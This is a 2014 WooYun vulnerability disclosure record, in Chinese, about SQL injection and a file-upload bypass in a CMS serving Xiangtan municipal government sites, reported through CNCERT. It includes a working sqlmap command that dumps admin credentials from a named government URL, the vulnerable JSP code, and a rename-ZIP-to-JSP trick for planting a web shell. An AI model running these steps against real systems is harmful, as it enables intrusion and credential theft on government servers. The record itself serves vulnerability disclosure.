{"id": 51359, "wybug_id": "wooyun-2014-074810", "wybug_title": "从科创某版本cms到湘潭市政府站群", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "BMa", "wybug_date": "2014-09-05 18:40", "wybug_open_date": "2014-10-20 18:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向公众公开  简要描述： 科创某cms存在sql注入漏洞以及后台任意文件上传漏洞导致湘潭政府站群沦陷包括:湘潭市政府门户湘潭市园区经济网湘潭市招标监管网市电子政务管理办公司湘潭市昭山示范区湘潭市水库移民开发管理局湘潭市政务中心湘潭市粮食局湘潭市交通运输委湘潭市文广新局湘潭市工商业联合会湘潭市人防办湘潭市农办等攒了有一段时间了,貌似还有一个红网的新闻站在同一个内网,内网的另一个新闻网站服务器也拿下了,,好久没管,记不清了,,,,建议自查,,内网就不截图了, 详细说明：  科创某cms存在sql注入漏洞以及后台任意文件上传漏洞<此网站的被修改了,但是可以重命名zip为jsp>,上传jsp shell得到系统权限注入点:\nsqlmap -u \"http://www.xiangtan.gov.cn/comm/xiangtan_hd/shizhangxinxiang/szxx_hit.jsp?id=21833\" -D XTMH1 -T TD_SM_USER -C USER_NAME,USER_PASSWORD --dump\n[18:08:13] [INFO] retrieved: admin[18:08:13] [INFO] retrieved: xiangtanadmin后台:\nhttp://www.xiangtan.gov.cn/login.jsp\n注入漏洞:没有任何过滤\n<%  DBUtil db=new DBUtil();  String docid=\"\";  docid=request.getParameter(\"id\");  String updatesql=\"update td_comm_ldxxgzly set hits=decode(hits,null,1,hits+1) where id=\"+docid+\"\";   db.executeUpdate(updatesql);  db.executeSelect(\"select hits from td_comm_ldxxgzly where id=\"+docid+\"\");  if(db.size()>0){   out.print(db.getString(0,\"hits\")+\"次\");  }%>\n上传:可能是由于以前出过漏洞,这里document.form1.action被删了,不能上传文件,只是提示成功\nfunction uploadFile(){\tvar file = document.form1.newFile.value;\tif(file.search(/\\S/img)==-1){\t\talert(\"请选择一个要上传的文件!\");\t\treturn;\t}\tdocument.form1.submit();\n突破:uploadZipFile.jsp限定了上传类型为zip\nfunction uploadZipFile(){\tvar file = document.form1.newFile.value.toLowerCase();\tif(file.search(/\\S/img)==-1){\t\talert(\"请选择一个要上传的文件!\");\t\treturn;\t}\tif(file.search(/\\.zip$/img)==-1){\t\talert(\"只能是zip格式压缩的文件，其他格式的文件将不会解压!\");\t\treturn;\t\t\t}\tvar uri2 = uri.replace(/\\s/img); \tif(uri2==\"/\"||uri2==\"\\\\\"||uri2==\"\"){\t\tif(!window.confirm(\"当前目录为根目录，你确实要把文件上传解压到根目录吗?\")){\t\t\treturn;\t\t\t\t}\t}\tdocument.form1.action = \"uploadZipFile_do.jsp?uri=\"+uri;\t\t\t\tdocument.form1.submit();\n但是reName_do.jsp没有验证修改的文件名\nif(viewtype != null && viewtype.equals(\"other\")){%><script type=\"text/javascript\">\talert(\"给文件(文件夹)改名成功!\");\tvar urlstr = parent.window.dialogArguments.parent.ImageListFrm.location.href;\tparent.window.dialogArguments.parent.ImageListFrm.location.href = urlstr;\twindow.close();</script><%\n   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  找科创吧   版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-10 09:10 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}